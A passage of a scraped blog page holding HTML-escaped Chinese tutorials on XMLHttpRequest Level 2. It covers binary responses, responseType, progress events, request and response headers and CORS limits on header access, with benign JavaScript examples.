&lt;p&gt;for (var i = 0, len = binStr.length; i &amp;lt; len; ++i) {&lt;/p&gt;
&lt;p&gt;var c = binStr.charCodeAt(i);&lt;/p&gt;
&lt;p&gt;var byte = c &amp;amp; 0xff;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后一行的位运算&amp;quot;c &amp;amp; 0xff&amp;quot;，表示在每个字符的两个字节之中，只保留后一个字节，将前一个字节扔掉。原因是浏览器解读字符的时候，会把字符自动&lt;a href=&#34;https://web.archive.org/web/20080821092906/http://mgran.blogspot.com/2006/08/downloading-binary-streams-with.html&#34;&gt;解读&lt;/a&gt;成Unicode的0xF700-0xF7ff区段。&lt;/p&gt;
&lt;h2 id=&#34;八-接收二进制数据方法bresponsetype属性&#34;&gt;&lt;strong&gt;八、接收二进制数据（方法B：responseType属性）&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;从服务器取回二进制数据，较新的方法是使用新增的responseType属性。如果服务器返回文本数据，这个属性的值是&amp;quot;TEXT&amp;quot;，这是默认值。较新的浏览器还支持其他值，也就是说，可以接收其他格式的数据。&lt;/p&gt;
&lt;p&gt;你可以把responseType设为blob，表示服务器传回的是二进制对象。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var xhr = new XMLHttpRequest();&lt;/p&gt;
&lt;p&gt;xhr.open(&#39;GET&#39;, &#39;/path/to/image.png&#39;);&lt;/p&gt;
&lt;p&gt;xhr.responseType = &#39;blob&#39;;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接收数据的时候，用浏览器自带的Blob对象即可。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var blob = new Blob([xhr.response], {type: &#39;image/png&#39;});&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意，是读取xhr.response，而不是xhr.responseText。&lt;/p&gt;
&lt;p&gt;你还可以将responseType设为arraybuffer，把二进制数据装在一个数组里。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var xhr = new XMLHttpRequest();&lt;/p&gt;
&lt;p&gt;xhr.open(&#39;GET&#39;, &#39;/path/to/image.png&#39;);&lt;/p&gt;
&lt;p&gt;xhr.responseType = &amp;quot;arraybuffer&amp;quot;;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接收数据的时候，需要遍历这个数组。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;var arrayBuffer = xhr.response;&lt;/p&gt;
&lt;p&gt;if (arrayBuffer) {&lt;/p&gt;
&lt;p&gt;var byteArray = new Uint8Array(arrayBuffer);&lt;/p&gt;
&lt;p&gt;for (var i = 0; i &amp;lt; byteArray.byteLength; i++) {&lt;/p&gt;
&lt;p&gt;// do something&lt;/p&gt;
&lt;p&gt;}&lt;br&gt;
　　}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;更详细的讨论，请看&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Sending_and_Receiving_Binary_Data&#34;&gt;Sending and Receiving Binary Data&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;九-进度信息&#34;&gt;&lt;strong&gt;九、进度信息&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;新版本的XMLHttpRequest对象，传送数据的时候，有一个progress事件，用来返回进度信息。&lt;/p&gt;
&lt;p&gt;它分成上传和下载两种情况。下载的progress事件属于XMLHttpRequest对象，上传的progress事件属于XMLHttpRequest.upload对象。&lt;/p&gt;
&lt;p&gt;我们先定义progress事件的回调函数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xhr.onprogress = updateProgress;&lt;/p&gt;
&lt;p&gt;xhr.upload.onprogress = updateProgress;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，在回调函数里面，使用这个事件的一些属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;function updateProgress(event) {&lt;/p&gt;
&lt;p&gt;if (event.lengthComputable) {&lt;/p&gt;
&lt;p&gt;var percentComplete = event.loaded / event.total;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的代码中，event.total是需要传输的总字节，event.loaded是已经传输的字节。如果event.lengthComputable不为真，则event.total等于0。&lt;/p&gt;
&lt;p&gt;与progress事件相关的，还有其他五个事件，可以分别指定回调函数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;* load事件：传输成功完成。&lt;/p&gt;
&lt;p&gt;* abort事件：传输被用户取消。&lt;/p&gt;
&lt;p&gt;* error事件：传输中出现错误。&lt;/p&gt;
&lt;p&gt;* loadstart事件：传输开始。&lt;/p&gt;
&lt;p&gt;* loadEnd事件：传输结束，但是不知道成功还是失败。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;十-阅读材料&#34;&gt;&lt;strong&gt;十、阅读材料&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;1. &lt;a href=&#34;https://dev.opera.com/articles/view/xhr2/&#34;&gt;Introduction to XMLHttpRequest Level 2&lt;/a&gt;： 新功能的综合介绍。&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&#34;https://www.html5rocks.com/en/tutorials/file/xhr2/&#34;&gt;New Tricks in XMLHttpRequest 2&lt;/a&gt;：一些用法的介绍。&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Using_XMLHttpRequest&#34;&gt;Using XMLHttpRequest&lt;/a&gt;：一些高级用法，主要针对Firefox浏览器。&lt;/p&gt;
&lt;p&gt;4. &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/HTTP_access_control&#34;&gt;HTTP Access Control&lt;/a&gt;：CORS综述。&lt;/p&gt;
&lt;p&gt;5. &lt;a href=&#34;https://dev.opera.com/articles/view/dom-access-control-using-cross-origin-resource-sharing/&#34;&gt;DOM access control using cross-origin resource sharing&lt;/a&gt;：CORS的9种HTTP头信息&lt;/p&gt;
&lt;p&gt;6. &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Server-Side_Access_Control&#34;&gt;Server-Side Access Control&lt;/a&gt;：服务器端CORS设置。&lt;/p&gt;
&lt;p&gt;7. &lt;a href=&#34;http://enable-cors.org/&#34;&gt;Enable CORS&lt;/a&gt;：服务端CORS设置。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html&#34;&gt;http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.html5rocks.com/zh/tutorials/file/xhr2/&#34;&gt;https://www.html5rocks.com/zh/tutorials/file/xhr2/&lt;/a&gt;&lt;/p&gt;
">62-http-14-XMLHttpRequest Level2</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-xmlhttprequest/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest详解&lt;/p&gt;
&lt;h2 id=&#34;ajax和xmlhttprequest&#34;&gt;&lt;code&gt;Ajax&lt;/code&gt;和&lt;code&gt;XMLHttpRequest&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;我们通常将&lt;code&gt;Ajax&lt;/code&gt;等同于&lt;code&gt;XMLHttpRequest&lt;/code&gt;，但细究起来它们两个是属于不同维度的2个概念。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以下是我认为对&lt;code&gt;Ajax&lt;/code&gt;较为准确的解释：（摘自&lt;a href=&#34;https://link.segmentfault.com/?url=http%3A%2F%2Fwww.tutorialspoint.com%2Fajax%2Fwhat_is_ajax.htm&#34;&gt;what is Ajax&lt;/a&gt;）&lt;br&gt;
AJAX stands for Asynchronous JavaScript and XML. AJAX is a new technique for creating better, faster, and more interactive web applications with the help of XML, HTML, CSS, and Java Script.&lt;/p&gt;
&lt;p&gt;AJAX is based on the following open standards:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Browser-based presentation using HTML and Cascading Style Sheets (CSS).&lt;/li&gt;
&lt;li&gt;Data is stored in XML format and fetched from the server.&lt;/li&gt;
&lt;li&gt;Behind-the-scenes data fetches using XMLHttpRequest objects in the browser.&lt;/li&gt;
&lt;li&gt;JavaScript to make everything happen.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;从上面的解释中可以知道：&lt;code&gt;ajax&lt;/code&gt;是一种技术方案，但并不是一种&lt;strong&gt;新技术&lt;/strong&gt;。它依赖的是现有的&lt;code&gt;CSS&lt;/code&gt;/&lt;code&gt;HTML&lt;/code&gt;/&lt;code&gt;Javascript&lt;/code&gt;，而其中最核心的依赖是浏览器提供的&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象，是这个对象使得浏览器可以发出&lt;code&gt;HTTP&lt;/code&gt;请求与接收&lt;code&gt;HTTP&lt;/code&gt;响应。&lt;/p&gt;
&lt;p&gt;所以我用一句话来总结两者的关系：我们使用&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象来发送一个&lt;code&gt;Ajax&lt;/code&gt;请求。&lt;/p&gt;
&lt;h2 id=&#34;xmlhttprequest的发展历程&#34;&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;的发展历程&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;一开始只是微软浏览器提供的一个接口，后来各大浏览器纷纷效仿也提供了这个接口，再后来W3C对它进行了标准化，提出了&lt;a href=&#34;https://link.segmentfault.com/?url=https%3A%2F%2Fwww.w3.org%2FTR%2FXMLHttpRequest%2F&#34;&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;标准&lt;/a&gt;。&lt;code&gt;XMLHttpRequest&lt;/code&gt;标准又分为&lt;code&gt;Level 1&lt;/code&gt;和&lt;code&gt;Level 2&lt;/code&gt;。&lt;br&gt;
&lt;code&gt;XMLHttpRequest Level 1&lt;/code&gt;主要存在以下缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;受同源策略的限制，不能发送跨域请求；&lt;/li&gt;
&lt;li&gt;不能发送二进制文件（如图片、视频、音频等），只能发送纯文本数据；&lt;/li&gt;
&lt;li&gt;在发送和获取数据的过程中，无法实时获取进度信息，只能判断是否完成；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么&lt;code&gt;Level 2&lt;/code&gt;对&lt;code&gt;Level 1&lt;/code&gt; 进行了改进，&lt;code&gt;XMLHttpRequest Level 2&lt;/code&gt;中新增了以下功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以发送跨域请求，在服务端允许的情况下；&lt;/li&gt;
&lt;li&gt;支持发送和接收二进制数据；&lt;/li&gt;
&lt;li&gt;新增formData对象，支持发送表单数据；&lt;/li&gt;
&lt;li&gt;发送和获取数据时，可以获取进度信息；&lt;/li&gt;
&lt;li&gt;可以设置请求的超时时间；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xmlhttprequest兼容性&#34;&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;兼容性&lt;/h2&gt;
&lt;p&gt;关于&lt;code&gt;xhr&lt;/code&gt;的浏览器兼容性，大家可以直接查看“Can I use”这个网站提供的结果&lt;a href=&#34;https://link.segmentfault.com/?url=http%3A%2F%2Fcaniuse.com%2F%23search%3DXMLHttpRequest&#34;&gt;XMLHttpRequest兼容性&lt;/a&gt;，下面提供一个截图。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1626360606163.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;从图中可以看到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IE8/IE9、Opera Mini 完全不支持&lt;code&gt;xhr&lt;/code&gt;对象&lt;/li&gt;
&lt;li&gt;IE10/IE11部分支持，不支持 &lt;code&gt;xhr.responseType&lt;/code&gt;为&lt;code&gt;json&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;部分浏览器不支持设置请求超时，即无法使用&lt;code&gt;xhr.timeout&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;部分浏览器不支持&lt;code&gt;xhr.responseType&lt;/code&gt;为&lt;code&gt;blob&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;细说xmlhttprequest如何使用&#34;&gt;细说&lt;code&gt;XMLHttpRequest&lt;/code&gt;如何使用&lt;/h2&gt;
&lt;p&gt;先来看一段使用&lt;code&gt;XMLHttpRequest&lt;/code&gt;发送&lt;code&gt;Ajax&lt;/code&gt;请求的简单示例代码。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function sendAjax() {
  //构造表单数据
  var formData = new FormData();
  formData.append(&#39;username&#39;, &#39;johndoe&#39;);
  formData.append(&#39;id&#39;, 123456);
  //创建xhr对象 
  var xhr = new XMLHttpRequest();
  //设置xhr请求的超时时间
  xhr.timeout = 3000;
  //设置响应返回的数据格式
  xhr.responseType = &amp;quot;text&amp;quot;;
  //创建一个 post 请求，采用异步
  xhr.open(&#39;POST&#39;, &#39;/server&#39;, true);
  //注册相关事件回调处理函数
  xhr.onload = function(e) { 
    if(this.status == 200||this.status == 304){
        alert(this.responseText);
    }
  };
  xhr.ontimeout = function(e) { ... };
  xhr.onerror = function(e) { ... };
  xhr.upload.onprogress = function(e) { ... };
  
  //发送数据
  xhr.send(formData);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面是一个使用&lt;code&gt;xhr&lt;/code&gt;发送表单数据的示例，整个流程可以参考注释。&lt;/p&gt;
&lt;p&gt;接下来我将站在使用者的角度，以问题的形式介绍&lt;code&gt;xhr&lt;/code&gt;的基本使用。&lt;br&gt;
我对每一个问题涉及到的知识点都会进行比较细致地介绍，有些知识点可能是你平时忽略关注的。&lt;/p&gt;
&lt;h3 id=&#34;如何设置request-header&#34;&gt;如何设置request header&lt;/h3&gt;
&lt;p&gt;在发送&lt;code&gt;Ajax&lt;/code&gt;请求（实质是一个&lt;a href=&#34;https://link.segmentfault.com/?url=http%3A%2F%2Fwww.tutorialspoint.com%2Fhttp%2Fhttp_header_fields.htm&#34;&gt;HTTP&lt;/a&gt;请求）时，我们可能需要设置一些请求头部信息，比如&lt;code&gt;content-type&lt;/code&gt;、&lt;code&gt;connection&lt;/code&gt;、&lt;code&gt;cookie&lt;/code&gt;、&lt;code&gt;accept-xxx&lt;/code&gt;等。&lt;code&gt;xhr&lt;/code&gt;提供了&lt;code&gt;setRequestHeader&lt;/code&gt;来允许我们修改请求 header。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;void setRequestHeader(DOMString header, DOMString value);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法的第一个参数 header 大小写不敏感，即可以写成&lt;code&gt;content-type&lt;/code&gt;，也可以写成&lt;code&gt;Content-Type&lt;/code&gt;，甚至写成&lt;code&gt;content-Type&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Content-Type&lt;/code&gt;的默认值与具体发送的数据类型有关，请参考本文【可以发送什么类型的数据】一节；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setRequestHeader&lt;/code&gt;必须在&lt;code&gt;open()&lt;/code&gt;方法之后，&lt;code&gt;send()&lt;/code&gt;方法之前调用，否则会抛错；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setRequestHeader&lt;/code&gt;可以调用多次，最终的值不会采用覆盖&lt;code&gt;override&lt;/code&gt;的方式，而是采用追加&lt;code&gt;append&lt;/code&gt;的方式。下面是一个示例代码：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var client = new XMLHttpRequest();
client.open(&#39;GET&#39;, &#39;demo.cgi&#39;);
client.setRequestHeader(&#39;X-Test&#39;, &#39;one&#39;);
client.setRequestHeader(&#39;X-Test&#39;, &#39;two&#39;);
// 最终request header中&amp;quot;X-Test&amp;quot;为: one, two
client.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;如何获取response-header&#34;&gt;如何获取response header&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;xhr&lt;/code&gt;提供了2个用来获取响应头部的方法：&lt;code&gt;getAllResponseHeaders&lt;/code&gt;和&lt;code&gt;getResponseHeader&lt;/code&gt;。前者是获取 response 中的所有header 字段，后者只是获取某个指定 header 字段的值。另外，&lt;code&gt;getResponseHeader(header)&lt;/code&gt;的&lt;code&gt;header&lt;/code&gt;参数不区分大小写。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;DOMString getAllResponseHeaders();`
`DOMString getResponseHeader(DOMString header);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;这2个方法看起来简单，但却处处是坑儿。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;你是否遇到过下面的坑儿?——反正我是遇到了。。。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;code&gt;getAllResponseHeaders()&lt;/code&gt;看到的所有&lt;code&gt;response header&lt;/code&gt;与实际在控制台 &lt;code&gt;Network&lt;/code&gt; 中看到的 &lt;code&gt;response header&lt;/code&gt; 不一样&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;getResponseHeader()&lt;/code&gt;获取某个 &lt;code&gt;header&lt;/code&gt; 的值时，浏览器抛错&lt;code&gt;Refused to get unsafe header &amp;quot;XXX&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过一番寻找最终在 &lt;a href=&#34;https://link.segmentfault.com/?url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F7462968%2Frestrictions-of-xmlhttprequests-getresponseheader&#34;&gt;Stack Overflow找到了答案&lt;/a&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原因1：&lt;a href=&#34;https://link.segmentfault.com/?url=https%3A%2F%2Fwww.w3.org%2FTR%2FXMLHttpRequest%2F&#34;&gt;W3C的 xhr 标准中做了限制&lt;/a&gt;，规定客户端无法获取 response 中的 &lt;code&gt;Set-Cookie&lt;/code&gt;、&lt;code&gt;Set-Cookie2&lt;/code&gt;这2个字段，无论是同域还是跨域请求；&lt;/li&gt;
&lt;li&gt;原因2：&lt;a href=&#34;https://link.segmentfault.com/?url=https%3A%2F%2Fwww.w3.org%2FTR%2Fcors%2F%23access-control-allow-credentials-response-header&#34;&gt;W3C 的 cors 标准对于跨域请求也做了限制&lt;/a&gt;，规定对于跨域请求，客户端允许获取的response header字段只限于“&lt;code&gt;simple response header&lt;/code&gt;”和“&lt;code&gt;Access-Control-Expose-Headers&lt;/code&gt;” （两个名词的解释见下方）。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;quot;&lt;code&gt;simple response header&lt;/code&gt;&amp;quot;包括的 header 字段有：&lt;code&gt;Cache-Control&lt;/code&gt;,&lt;code&gt;Content-Language&lt;/code&gt;,&lt;code&gt;Content-Type&lt;/code&gt;,&lt;code&gt;Expires&lt;/code&gt;,&lt;code&gt;Last-Modified&lt;/code&gt;,&lt;code&gt;Pragma&lt;/code&gt;;&lt;br&gt;
&amp;quot;&lt;code&gt;Access-Control-Expose-Headers&lt;/code&gt;&amp;quot;：首先得注意是&amp;quot;&lt;code&gt;Access-Control-Expose-Headers&lt;/code&gt;&amp;quot;进行&lt;strong&gt;跨域请求&lt;/strong&gt;时响应头部中的一个字段，对于同域请求，响应头部是没有这个字段的。这个字段中列举的 header 字段就是服务器允许暴露给客户端访问的字段。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以&lt;code&gt;getAllResponseHeaders()&lt;/code&gt;只能拿到*&lt;strong&gt;限制以外*&lt;/strong&gt;（即被视为&lt;code&gt;safe&lt;/code&gt;）的header字段，而不是全部字段；而调用&lt;code&gt;getResponseHeader(header)&lt;/code&gt;方法时，&lt;code&gt;header&lt;/code&gt;参数必须是***限制以外***的header字段，否则调用就会报&lt;code&gt;Refused to get unsafe header&lt;/code&gt;的错误。&lt;/p&gt;
&lt;h3 id=&#34;如何指定xhrresponse的数据类型&#34;&gt;如何指定&lt;code&gt;xhr.response&lt;/code&gt;的数据类型&lt;/h3&gt;
&lt;p&gt;有些时候我们希望&lt;code&gt;xhr.response&lt;/code&gt;返回的就是我们想要的数据类型。比如：响应返回的数据是纯JSON字符串，但我们期望最终通过&lt;code&gt;xhr.response&lt;/code&gt;拿到的直接就是一个 js 对象，我们该怎么实现呢？&lt;br&gt;
有2种方法可以实现，一个是&lt;code&gt;level 1&lt;/code&gt;就提供的&lt;code&gt;overrideMimeType()&lt;/code&gt;方法，另一个是&lt;code&gt;level 2&lt;/code&gt;才提供的&lt;code&gt;xhr.responseType&lt;/code&gt;属性。&lt;/p&gt;
&lt;h4 id=&#34;xhroverridemimetype&#34;&gt;&lt;code&gt;xhr.overrideMimeType()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;overrideMimeType&lt;/code&gt;是&lt;code&gt;xhr level 1&lt;/code&gt;就有的方法，所以浏览器兼容性良好。这个方法的作用就是用来重写&lt;code&gt;response&lt;/code&gt;的&lt;code&gt;content-type&lt;/code&gt;，这样做有什么意义呢？比如：server 端给客户端返回了一份&lt;code&gt;document&lt;/code&gt;或者是 &lt;code&gt;xml&lt;/code&gt;文档，我们希望最终通过&lt;code&gt;xhr.response&lt;/code&gt;拿到的就是一个&lt;code&gt;DOM&lt;/code&gt;对象，那么就可以用&lt;code&gt;xhr.overrideMimeType(&#39;text/xml; charset = utf-8&#39;)&lt;/code&gt;来实现。&lt;/p&gt;
&lt;p&gt;再举一个使用场景，我们都知道&lt;code&gt;xhr level 1&lt;/code&gt;不支持直接传输blob二进制数据，那如果真要传输 blob 该怎么办呢？当时就是利用&lt;code&gt;overrideMimeType&lt;/code&gt;方法来解决这个问题的。&lt;/p&gt;
&lt;p&gt;下面是一个获取图片文件的代码示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var xhr = new XMLHttpRequest();
//向 server 端获取一张图片
xhr.open(&#39;GET&#39;, &#39;/path/to/image.png&#39;, true);

// 这行是关键！
//将响应数据按照纯文本格式来解析，字符集替换为用户自己定义的字符集
xhr.overrideMimeType(&#39;text/plain; charset=x-user-defined&#39;);

xhr.onreadystatechange = function(e) {
  if (this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) {
    //通过 responseText 来获取图片文件对应的二进制字符串
    var binStr = this.responseText;
    //然后自己再想方法将逐个字节还原为二进制数据
    for (var i = 0, len = binStr.length; i &amp;lt; len; ++i) {
      var c = binStr.charCodeAt(i);
      //String.fromCharCode(c &amp;amp; 0xff);
      var byte = c &amp;amp; 0xff; 
    }
  }
};

xhr.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码示例中&lt;code&gt;xhr&lt;/code&gt;请求的是一张图片，通过将 &lt;code&gt;response&lt;/code&gt; 的 &lt;code&gt;content-type&lt;/code&gt; 改为&#39;text/plain; charset=x-user-defined&#39;，使得 &lt;code&gt;xhr&lt;/code&gt; 以纯文本格式来解析接收到的blob 数据，最终用户通过&lt;code&gt;this.responseText&lt;/code&gt;拿到的就是图片文件对应的二进制字符串，最后再将其转换为 blob 数据。&lt;/p&gt;
&lt;h4 id=&#34;xhrresponsetype&#34;&gt;&lt;code&gt;xhr.responseType&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;responseType&lt;/code&gt;是&lt;code&gt;xhr level 2&lt;/code&gt;新增的属性，用来指定&lt;code&gt;xhr.response&lt;/code&gt;的数据类型，目前还存在些兼容性问题，可以参考本文的【&lt;code&gt;XMLHttpRequest&lt;/code&gt;的兼容性】这一小节。那么&lt;code&gt;responseType&lt;/code&gt;可以设置为哪些格式呢，我简单做了一个表，如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;值&lt;/th&gt;
&lt;th&gt;&lt;code&gt;xhr.response&lt;/code&gt; 数据类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;String&lt;/code&gt;字符串&lt;/td&gt;
&lt;td&gt;默认值(在不设置&lt;code&gt;responseType&lt;/code&gt;时)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;text&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;String&lt;/code&gt;字符串&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;document&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Document&lt;/code&gt;对象&lt;/td&gt;
&lt;td&gt;希望返回 &lt;code&gt;XML&lt;/code&gt; 格式数据时使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;json&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;javascript&lt;/code&gt; 对象&lt;/td&gt;
&lt;td&gt;存在兼容性问题，IE10/IE11不支持&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;blob&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Blob&lt;/code&gt;对象&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&amp;quot;arrayBuffer&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;ArrayBuffer&lt;/code&gt;对象&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下面是同样是获取一张图片的代码示例，相比&lt;code&gt;xhr.overrideMimeType&lt;/code&gt;,用&lt;code&gt;xhr.response&lt;/code&gt;来实现简单得多。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var xhr = new XMLHttpRequest();
xhr.open(&#39;GET&#39;, &#39;/path/to/image.png&#39;, true);
//可以将`xhr.responseType`设置为`&amp;quot;blob&amp;quot;`也可以设置为`&amp;quot; arrayBuffer&amp;quot;`
//xhr.responseType = &#39;arrayBuffer&#39;;
xhr.responseType = &#39;blob&#39;;

xhr.onload = function(e) {
  if (this.status == 200) {
    var blob = this.response;
    ...
  }
};

xhr.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;小结&#34;&gt;小结&lt;/h4&gt;
&lt;p&gt;虽然在&lt;code&gt;xhr level 2&lt;/code&gt;中，2者是共同存在的。但其实不难发现，&lt;code&gt;xhr.responseType&lt;/code&gt;就是用来取代&lt;code&gt;xhr.overrideMimeType()&lt;/code&gt;的，&lt;code&gt;xhr.responseType&lt;/code&gt;功能强大的多，&lt;code&gt;xhr.overrideMimeType()&lt;/code&gt;能做到的&lt;code&gt;xhr.responseType&lt;/code&gt;都能做到。所以我们现在完全可以摒弃使用&lt;code&gt;xhr.overrideMimeType()&lt;/code&gt;了。&lt;/p&gt;
&lt;h3 id=&#34;如何获取response数据&#34;&gt;如何获取response数据&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;xhr`提供了3个属性来获取请求返回的数据，分别是：`xhr.response`、`xhr.responseText`、`xhr.responseXML
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xhr.response&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;默认值：空字符串&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;当请求完成时，此属性才有正确的值&lt;/li&gt;
&lt;li&gt;请求未完成时，此属性的值可能是&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;或者 &lt;code&gt;null&lt;/code&gt;，具体与 &lt;code&gt;xhr.responseType&lt;/code&gt;有关：当&lt;code&gt;responseType&lt;/code&gt;为&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;或&lt;code&gt;&amp;quot;text&amp;quot;&lt;/code&gt;时，值为&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;；&lt;code&gt;responseType&lt;/code&gt;为其他值时，值为 &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.responseText&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;默认值为空字符串&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/li&gt;
